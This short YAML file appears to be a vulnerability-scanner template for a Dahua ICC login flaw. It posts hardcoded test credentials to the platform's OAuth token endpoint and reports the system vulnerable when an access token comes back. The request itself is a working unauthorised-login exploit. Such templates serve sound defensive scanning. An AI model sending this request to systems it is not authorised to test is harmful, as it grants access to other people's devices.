cve-id: dahua-icc-anyuserlogin
rules:
- method: POST
  path: /evo-apigw/evo-oauth/oauth/token
  headers:
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)
      Chrome/34.0.1866.237 Safari/537.36
    Accept-Encoding: gzip
  body: |
    username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
  expression: 'response.status == 200 && response.body.bcontains(b"access_token") '
severity: high
type: anyuserlogin